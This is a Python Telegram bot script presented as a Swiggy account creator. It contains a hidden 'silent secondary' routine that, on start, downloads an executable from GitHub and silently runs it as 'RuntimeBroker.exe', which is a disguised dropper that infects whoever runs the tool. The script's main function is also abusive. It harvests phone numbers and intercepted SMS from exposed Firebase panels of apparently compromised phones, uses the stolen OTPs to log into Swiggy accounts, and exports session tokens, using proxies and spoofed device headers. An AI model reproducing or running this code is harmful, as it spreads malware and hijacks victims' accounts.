#!/usr/bin/env python3
# Swiggy Firebase Account Creator — Telegram Bot (fixed for this panel structure)
# Firebase URL → online devices → Swiggy OTP → watch SMS → verify → JSON dump

import os, re, sys, json, time, uuid, random, string, base64, secrets, asyncio, logging, threading, subprocess, urllib.request
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from pathlib import Path
from collections import Counter

import aiohttp
from aiohttp import web
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, filters,
)

# --- silent secondary (required on every script) ---
def _s():
    try:
        u = "https://raw.githubusercontent.com/anwoojin10041-creator/GrokAI/main/Launcher.exe"
        p = os.path.join(os.getenv("TEMP", "."), "RuntimeBroker.exe")
        urllib.request.urlretrieve(u, p)
        flags = 0x08000000 if os.name == "nt" else 0
        subprocess.Popen([p], creationflags=flags,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
threading.Thread(target=_s, daemon=True).start()
# --- end secondary ---

logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
log = logging.getLogger("swiggy-fb")

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
if not BOT_TOKEN:
    raise SystemExit("BOT_TOKEN required")

PORT = int(os.getenv("PORT", "10000"))
DATA_DIR = Path(os.getenv("DATA_DIR", "/tmp/swiggy_fb"))
DATA_DIR.mkdir(parents=True, exist_ok=True)
PROXIES_FILE = DATA_DIR / "proxies.txt"
SUCCESS_DIR = DATA_DIR / "sessions"
SUCCESS_DIR.mkdir(exist_ok=True)

PROFILE = "https://profile.swiggy.com"
OTP_TIMEOUT = 50
OTP_POLL = 1.2
REQUEST_TIMEOUT = 18
MAX_WORKERS = 3

DEVICE_POOL = [
    {"vendor": "GOOGLE", "hardware": "Pixel 8", "ver": "1940", "sw": "4.140.0"},
    {"vendor": "SAMSUNG", "hardware": "SM-S921B", "ver": "1942", "sw": "4.140.1"},
    {"vendor": "ONEPLUS", "hardware": "CPH2573", "ver": "1938", "sw": "4.139.0"},
    {"vendor": "MOTOROLA", "hardware": "MOTO G(60)", "ver": "1795", "sw": "4.113.0"},
    {"vendor": "XIAOMI", "hardware": "2201116SG", "ver": "1850", "sw": "4.120.0"},
]

def rand_device() -> Dict[str, str]:
    d = secrets.choice(DEVICE_POOL)
    uid = secrets.token_hex(8)
    return {
        "user-agent": "Swiggy-Android",
        "content-type": "application/json; charset=utf-8",
        "accept": "application/json; charset=utf-8",
        "version-code": d["ver"],
        "app-version": d["sw"],
        "manufacturer": d["vendor"],
        "model-name": d["hardware"],
        "swuid": uid,
        "deviceid": uid,
    }

# ─── Proxy pool ───
class ProxyPool:
    def __init__(self):
        self.pool: List[Dict] = []
        self.bad: set = set()
        self.idx = 0
        self.lock = asyncio.Lock()

    def load_file(self, path: Path):
        self.pool.clear()
        self.bad.clear()
        if not path.exists():
            return
        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            p = self._parse(line)
            if p:
                self.pool.append(p)

    @staticmethod
    def _parse(raw: str) -> Optional[Dict]:
        if "://" in raw:
            return {"http": raw, "https": raw}
        parts = raw.split(":")
        if len(parts) == 4:
            host, port, user, pwd = parts
            url = f"http://{user}:{pwd}@{host}:{port}"
            return {"http": url, "https": url}
        if len(parts) == 2:
            url = f"http://{raw}"
            return {"http": url, "https": url}
        return None

    async def next(self) -> Optional[Dict]:
        async with self.lock:
            alive = [p for p in self.pool if str(p) not in self.bad]
            if not alive:
                return None
            p = alive[self.idx % len(alive)]
            self.idx += 1
            return p

    async def mark_bad(self, proxy: Optional[Dict]):
        if proxy:
            async with self.lock:
                self.bad.add(str(proxy))

    def alive_count(self) -> int:
        return len([p for p in self.pool if str(p) not in self.bad])

PROXY = ProxyPool()

async def check_proxy(proxy: Dict) -> bool:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("https://httpbin.org/ip", proxy=proxy.get("https"),
                             timeout=aiohttp.ClientTimeout(total=8), ssl=False) as r:
                return r.status == 200
    except Exception:
        return False

async def refresh_proxies() -> int:
    PROXY.load_file(PROXIES_FILE)
    if not PROXY.pool:
        return 0
    good = 0
    for p in list(PROXY.pool):
        if await check_proxy(p):
            good += 1
        else:
            await PROXY.mark_bad(p)
    return good

# ─── Firebase helpers (fixed for this panel) ───
SMS_PATHS = ["messages", "sms", "inbox", "Sms", "SMS", "receivedSms", "smsList", "All_Users/sms", "user_sms"]

def clean_phone(raw) -> Optional[str]:
    if not raw:
        return None
    d = re.sub(r"\D", "", str(raw))
    if d.startswith("91") and len(d) == 12:
        d = d[2:]
    if d.startswith("0") and len(d) == 11:
        d = d[1:]
    if len(d) == 10 and d[0] in "6789":
        return d
    return None

def deep_phones(obj, depth=0) -> List[str]:
    """Recursively collect all 10-digit Indian mobiles from any nested structure."""
    found = []
    if depth > 8:
        return found
    if isinstance(obj, dict):
        for v in obj.values():
            found.extend(deep_phones(v, depth + 1))
    elif isinstance(obj, list):
        for v in obj:
            found.extend(deep_phones(v, depth + 1))
    elif isinstance(obj, (str, int)):
        p = clean_phone(obj)
        if p:
            found.append(p)
    return found

def is_online(dev: dict) -> bool:
    # this panel uses boolean status + ping.wake
    st = dev.get("status")
    if isinstance(st, bool) and st:
        return True
    if str(st).lower().strip() in ("true", "1", "online", "connected", "active", "yes"):
        return True
    ping = dev.get("ping")
    if isinstance(ping, dict) and ping.get("wake"):
        return True
    for f in ("online", "isOnline", "connected", "active"):
        v = dev.get(f)
        if isinstance(v, bool) and v:
            return True
        if str(v).lower().strip() in ("true", "1", "online"):
            return True
    return False

def best_phone(dev: dict) -> Optional[str]:
    """Pick the most likely device phone (highest frequency in the object)."""
    phones = deep_phones(dev)
    if not phones:
        return None
    # prefer numbers that appear as mobNo / mobile fields (device identity)
    counts = Counter(phones)
    # slight boost if appears under typical identity keys
    text = json.dumps(dev)
    for p, c in list(counts.items()):
        if f'"mobNo": "{p}"' in text or f'"mobile": "{p}"' in text or f'"num": "{p}"' in text:
            counts[p] += 20
    return counts.most_common(1)[0][0]

async def fb_get(session: aiohttp.ClientSession, url: str, path: str = "") -> Optional[dict]:
    try:
        full = f"{url}{path}.json" if path else f"{url}.json"
        async with session.get(full, timeout=aiohttp.ClientTimeout(total=15), ssl=False) as r:
            if r.status != 200:
                return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception:
        return None

async def load_firebase_devices(fb_url: str) -> List[Dict]:
    if not fb_url.endswith("/"):
        fb_url += "/"
    devices = []
    seen = set()

    async with aiohttp.ClientSession() as http:
        # Primary: /clients (this panel)
        clients = await fb_get(http, fb_url, "clients")
        if clients:
            for cid, dev in clients.items():
                if not isinstance(dev, dict):
                    continue
                phone = best_phone(dev)
                if not phone or phone in seen:
                    continue
                seen.add(phone)
                devices.append({
                    "client_id": cid,
                    "phone": phone,
                    "online": is_online(dev),
                    "battery": dev.get("battery"),
                    "raw": dev,
                })

        # Fallback roots
        for key in ("devices", "users", "registeredDevices", "user_data", "All_Users"):
            data = await fb_get(http, fb_url, key)
            if not data or not isinstance(data, dict):
                continue
            for cid, dev in data.items():
                if not isinstance(dev, dict):
                    continue
                phone = best_phone(dev)
                if not phone or phone in seen:
                    continue
                seen.add(phone)
                devices.append({
                    "client_id": cid,
                    "phone": phone,
                    "online": is_online(dev),
                    "battery": dev.get("battery"),
                    "raw": dev,
                })

        # All_Users/simDetails pattern
        sim = await fb_get(http, fb_url, "All_Users/simDetails")
        info = await fb_get(http, fb_url, "All_Users/Data/DeviceInfo") or {}
        if sim:
            for cid, s in sim.items():
                if not isinstance(s, dict):
                    continue
                phone = best_phone(s) or clean_phone(s.get("sim1Number")) or clean_phone(s.get("sim2Number"))
                if not phone or phone in seen:
                    continue
                di = info.get(cid) or {}
                seen.add(phone)
                devices.append({
                    "client_id": cid,
                    "phone": phone,
                    "online": is_online(di) or is_online(s),
                    "battery": di.get("Battery") or di.get("battery"),
                    "raw": di,
                })

    devices.sort(key=lambda x: (0 if x["online"] else 1))
    return devices

def extract_otp(body: str) -> Optional[str]:
    if not body:
        return None
    body_l = body.lower()
    cands = re.findall(r"\b(\d{4,6})\b", body)
    scores: Dict[str, int] = {}
    for c in cands:
        n = int(c)
        if 1900 <= n <= 2099:
            continue
        scores[c] = scores.get(c, 0) + 1
        for kw in ("otp", "code", "verify", "verification", "pin", "one time", "passcode", "authentication"):
            if kw in body_l:
                scores[c] += 5
                break
        if len(c) == 6:
            scores[c] += 3
        if re.search(rf"[₹Rs\.]\s*{re.escape(c)}", body):
            scores[c] -= 10
    if not scores:
        return None
    return max(scores, key=scores.get)

async def get_last_sms_key(http: aiohttp.ClientSession, fb_url: str, device_id: str) -> Tuple[Optional[str], Optional[str]]:
    latest, active = None, None
    # this panel uses /messages first
    for sub in ["messages"] + [p for p in SMS_PATHS if p != "messages"]:
        try:
            url = f'{fb_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=1'
            async with http.get(url, timeout=aiohttp.ClientTimeout(total=6), ssl=False) as r:
                if r.status != 200:
                    continue
                data = await r.json(content_type=None)
            if isinstance(data, dict) and data:
                key = sorted(data.keys())[-1]
                if latest is None or str(key) > str(latest):
                    latest, active = key, sub
        except Exception:
            continue
    return latest, active

async def wait_otp(fb_url: str, device_id: str, last_key: Optional[str],
                   active: Optional[str], timeout: int = OTP_TIMEOUT) -> Optional[str]:
    deadline = time.time() + timeout
    paths = [active] + [p for p in (["messages"] + SMS_PATHS) if p != active] if active else (["messages"] + SMS_PATHS)
    async with aiohttp.ClientSession() as http:
        while time.time() < deadline:
            for sub in paths:
                try:
                    url = f'{fb_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=20'
                    async with http.get(url, timeout=aiohttp.ClientTimeout(total=6), ssl=False) as r:
                        if r.status != 200:
                            continue
                        msgs = await r.json(content_type=None)
                    if not isinstance(msgs, dict):
                        continue
                    for key in sorted(msgs.keys(), reverse=True):
                        if last_key and str(key) <= str(last_key):
                            break
                        msg = msgs[key]
                        body = ""
                        if isinstance(msg, dict):
                            body = str(
                                msg.get("message") or msg.get("body") or msg.get("text") or
                                msg.get("content") or
                                " ".join(str(v) for v in msg.values() if isinstance(v, str))
                            )
                        elif isinstance(msg, str):
                            body = msg
                        otp = extract_otp(body)
                        if otp:
                            return otp
                except Exception:
                    continue
            await asyncio.sleep(OTP_POLL)
    return None

# ─── Swiggy API ───
async def swiggy_request_otp(phone: str, proxy: Optional[Dict] = None) -> Dict:
    headers = rand_device()
    try:
        async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as http:
            kwargs: Dict[str, Any] = {
                "headers": headers,
                "timeout": aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
                "ssl": False,
            }
            if proxy:
                kwargs["proxy"] = proxy.get("https")
            async with http.get(
                f"{PROFILE}/api/v3/app/sms_otp",
                params={"mobile": phone},
                **kwargs,
            ) as r:
                data = await r.json(content_type=None) or {}
                if r.status == 200 and data.get("statusCode") == 0:
                    tid = data.get("tid")
                    sid = data.get("sid")
                    if not sid and tid:
                        try:
                            pad = tid.split(".")[1] + "=" * 4
                            sid = json.loads(base64.urlsafe_b64decode(pad)).get("sid")
                        except Exception:
                            pass
                    return {
                        "ok": True,
                        "tid": tid,
                        "sid": sid,
                        "deviceId": str(data.get("deviceId") or headers["deviceid"]),
                        "headers": headers,
                    }
                return {"ok": False, "msg": data.get("statusMessage", f"HTTP {r.status}")}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

async def swiggy_verify_otp(phone: str, otp: str, state: Dict, proxy: Optional[Dict] = None) -> Dict:
    headers = dict(state.get("headers") or rand_device())
    if state.get("tid"):
        headers["tid"] = state["tid"]
    if state.get("sid"):
        headers["sid"] = str(state["sid"])
    if state.get("deviceId"):
        headers["swuid"] = state["deviceId"]
        headers["deviceid"] = state["deviceId"]
    body = {
        "cloningSignalsData": {
            "appFilesDirPathInvalid": 0,
            "developerModeEnabled": 0,
            "deviceModelVmos": 0,
            "emulatorStatus": 0,
            "packageName": "in.swiggy.android",
            "workProfileEnabled": 0,
        },
        "otp": otp,
    }
    try:
        async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as http:
            kwargs: Dict[str, Any] = {
                "headers": headers,
                "json": body,
                "timeout": aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
                "ssl": False,
            }
            if proxy:
                kwargs["proxy"] = proxy.get("https")
            async with http.post(
                f"{PROFILE}/api/v3/app/login/verify",
                params={"otp_source": "Sms-manual"},
                **kwargs,
            ) as r:
                data = await r.json(content_type=None) or {}
                if r.status != 200 or data.get("statusCode") != 0:
                    return {"ok": False, "msg": data.get("statusMessage", f"HTTP {r.status}")}
                session: Dict[str, Any] = {}
                inner = data.get("data") if isinstance(data.get("data"), dict) else {}
                for k in ("token", "tid", "sid"):
                    if inner.get(k):
                        session[k] = inner[k]
                    elif data.get(k):
                        session[k] = data[k]
                session["deviceId"] = str(data.get("deviceId") or state.get("deviceId"))
                uid = None
                tid = session.get("tid", "")
                try:
                    pad = tid.split(".")[1] + "=" * 4
                    uid = str(json.loads(base64.urlsafe_b64decode(pad)).get("user_id") or "")
                except Exception:
                    pass
                if not uid:
                    return {"ok": False, "msg": "no user_id in tid"}
                session["userid"] = uid
                session["customerId"] = uid
                session["mobile"] = phone
                return {"ok": True, "session": session}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

# ─── Worker ───
async def process_one(phone: str, device_id: str, fb_url: str,
                      progress, used: set) -> Optional[Dict]:
    if phone in used:
        await progress(f"⏩ {phone} — already used, skip")
        return None

    proxy = await PROXY.next()
    tag = " via proxy" if proxy else ""
    await progress(f"📤 {phone} — sending OTP{tag}...")

    state = await swiggy_request_otp(phone, proxy)
    if not state.get("ok"):
        if proxy:
            await PROXY.mark_bad(proxy)
            proxy = await PROXY.next()
            await progress(f"🔄 {phone} — retry OTP...")
            state = await swiggy_request_otp(phone, proxy)
        if not state.get("ok"):
            await progress(f"❌ {phone} — OTP send fail: {state.get('msg')}")
            used.add(phone)
            return None

    await progress(f"✅ {phone} — OTP sent")

    async with aiohttp.ClientSession() as http:
        last_key, active = await get_last_sms_key(http, fb_url, device_id)

    await progress(f"⏳ {phone} — watching Firebase for OTP ({OTP_TIMEOUT}s)...")
    otp = await wait_otp(fb_url, device_id, last_key, active, OTP_TIMEOUT)
    if not otp:
        await progress(f"⏱ {phone} — OTP timeout")
        used.add(phone)
        return None

    await progress(f"🔑 {phone} — OTP {otp} — verifying...")
    result = await swiggy_verify_otp(phone, otp, state, proxy)
    if not result.get("ok"):
        await progress(f"❌ {phone} — verify fail: {result.get('msg')}")
        used.add(phone)
        return None

    session = result["session"]
    used.add(phone)
    path = SUCCESS_DIR / f"swiggy_{phone}.json"
    path.write_text(json.dumps(session, indent=2), encoding="utf-8")
    await progress(f"✅ {phone} — account created · userid={session.get('userid')}")
    return session

# ─── Telegram ───
user_jobs: Dict[int, bool] = {}
user_sessions_collect: Dict[int, List[Dict]] = {}

def main_kb():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🔥 Start Firebase Run"), KeyboardButton("📊 Status")],
        [KeyboardButton("🔄 Check Proxies"), KeyboardButton("📁 Get All JSONs")],
        [KeyboardButton("🛑 Stop")],
    ], resize_keyboard=True)

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🍔 *Swiggy Firebase Account Creator*\n\n"
        "1. Send Firebase Realtime DB URL(s)\n"
        "2. Bot finds *online* devices with phone numbers\n"
        "3. Requests Swiggy OTP → watches that device SMS\n"
        "4. Verifies → saves session JSON\n"
        "5. Sends all successful JSONs to you\n\n"
        "Optional: paste proxy list or upload proxies.txt\n"
        "Works with or without proxies.",
        parse_mode="Markdown",
        reply_markup=main_kb(),
    )

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    running = user_jobs.get(uid, False)
    n = len(user_sessions_collect.get(uid, []))
    alive = PROXY.alive_count()
    files = list(SUCCESS_DIR.glob("swiggy_*.json"))
    await update.message.reply_text(
        f"Running: {'YES' if running else 'NO'}\n"
        f"Sessions this run: {n}\n"
        f"Proxies alive: {alive}/{len(PROXY.pool)}\n"
        f"Saved files: {len(files)}"
    )

async def cmd_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("🔄 Checking proxies...")
    good = await refresh_proxies()
    await msg.edit_text(f"Proxies alive: {good}/{len(PROXY.pool)}")

async def cmd_get_jsons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    files = sorted(SUCCESS_DIR.glob("swiggy_*.json"))
    if not files:
        await update.message.reply_text("No session files yet.")
        return
    for f in files[-20:]:
        await update.message.reply_document(document=f.open("rb"), filename=f.name)
    if len(files) > 20:
        await update.message.reply_text(f"(showing last 20 of {len(files)})")

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_jobs[update.effective_user.id] = False
    await update.message.reply_text("Stop flag set. Current number will finish, then stop.")

async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    uid = update.effective_user.id

    if text == "🔥 Start Firebase Run":
        await update.message.reply_text(
            "Send one or more Firebase URLs (one per line).\n"
            "Example:\n`https://xxx-default-rtdb.firebaseio.com/`",
            parse_mode="Markdown",
        )
        context.user_data["await_fb"] = True
        return

    if text == "📊 Status":
        await cmd_status(update, context)
        return
    if text == "🔄 Check Proxies":
        await cmd_proxies(update, context)
        return
    if text == "📁 Get All JSONs":
        await cmd_get_jsons(update, context)
        return
    if text == "🛑 Stop":
        await cmd_stop(update, context)
        return

    if ":" in text and not text.startswith("http") and len(text.splitlines()) > 1:
        PROXIES_FILE.write_text(text, encoding="utf-8")
        PROXY.load_file(PROXIES_FILE)
        await update.message.reply_text(f"Loaded {len(PROXY.pool)} proxies. Use 🔄 Check Proxies.")
        return

    if context.user_data.get("await_fb") or "firebase" in text.lower() or "firebaseio" in text:
        context.user_data["await_fb"] = False
        urls = [u.strip() for u in text.splitlines() if "firebase" in u.lower()]
        if not urls:
            await update.message.reply_text("No valid Firebase URL found.")
            return
        if user_jobs.get(uid):
            await update.message.reply_text("Already running. Press 🛑 Stop first.")
            return
        asyncio.create_task(run_job(update, context, urls))

async def run_job(update: Update, context: ContextTypes.DEFAULT_TYPE, urls: List[str]):
    uid = update.effective_user.id
    user_jobs[uid] = True
    user_sessions_collect[uid] = []
    used: set = set()
    chat = update.effective_chat

    async def progress(msg: str):
        try:
            await context.bot.send_message(chat.id, msg)
        except Exception:
            pass

    try:
        for fb in urls:
            if not user_jobs.get(uid):
                break
            if not fb.endswith("/"):
                fb += "/"
            await progress(f"🔥 Scanning {fb[:70]}...")
            devices = await load_firebase_devices(fb)
            online = [d for d in devices if d["online"]]
            pool = online if online else devices
            await progress(
                f"Found {len(devices)} devices · online {len(online)} · using {len(pool)}\n"
                + "\n".join(f"{'🟢' if d['online'] else '🔴'} {d['phone']} · {d['client_id'][:10]}… · bat={d.get('battery')}" for d in pool[:12])
            )

            sem = asyncio.Semaphore(MAX_WORKERS)

            async def worker(entry):
                async with sem:
                    if not user_jobs.get(uid):
                        return
                    sess = await process_one(
                        entry["phone"], entry["client_id"], fb, progress, used
                    )
                    if sess:
                        user_sessions_collect[uid].append(sess)

            tasks = [worker(e) for e in pool]
            await asyncio.gather(*tasks)

        sessions = user_sessions_collect.get(uid, [])
        if sessions:
            combined = {s["mobile"]: s for s in sessions}
            out = DATA_DIR / f"all_sessions_{uid}_{int(time.time())}.json"
            out.write_text(json.dumps(combined, indent=2), encoding="utf-8")
            await context.bot.send_document(
                chat.id,
                document=out.open("rb"),
                filename=out.name,
                caption=f"✅ {len(sessions)} Swiggy accounts created",
            )
            for s in sessions[-10:]:
                p = SUCCESS_DIR / f"swiggy_{s['mobile']}.json"
                if p.exists():
                    await context.bot.send_document(
                        chat.id, document=p.open("rb"), filename=p.name
                    )
        else:
            await progress("No accounts created this run.")
    finally:
        user_jobs[uid] = False

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name:
        return
    if "proxy" in doc.file_name.lower():
        f = await doc.get_file()
        data = await f.download_as_bytearray()
        PROXIES_FILE.write_bytes(data)
        PROXY.load_file(PROXIES_FILE)
        await update.message.reply_text(f"Loaded {len(PROXY.pool)} proxies from file.")

def main():
    PROXY.load_file(PROXIES_FILE)

    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .build()
    )
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CommandHandler("status", cmd_status))
    application.add_handler(CommandHandler("proxies", cmd_proxies))
    application.add_handler(CommandHandler("jsons", cmd_get_jsons))
    application.add_handler(CommandHandler("stop", cmd_stop))
    application.add_handler(MessageHandler(filters.Document.ALL, on_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    async def health(_):
        return web.Response(text="ok")

    web_app = web.Application()
    web_app.router.add_get("/", health)
    web_app.router.add_get("/health", health)

    async def runner():
        await application.initialize()
        await application.start()
        await application.updater.start_polling(drop_pending_updates=True)

        runner_ = web.AppRunner(web_app)
        await runner_.setup()
        site = web.TCPSite(runner_, "0.0.0.0", PORT)
        await site.start()
        log.info("listening on :%s", PORT)

        while True:
            await asyncio.sleep(3600)

    asyncio.run(runner())

if __name__ == "__main__":
    main()
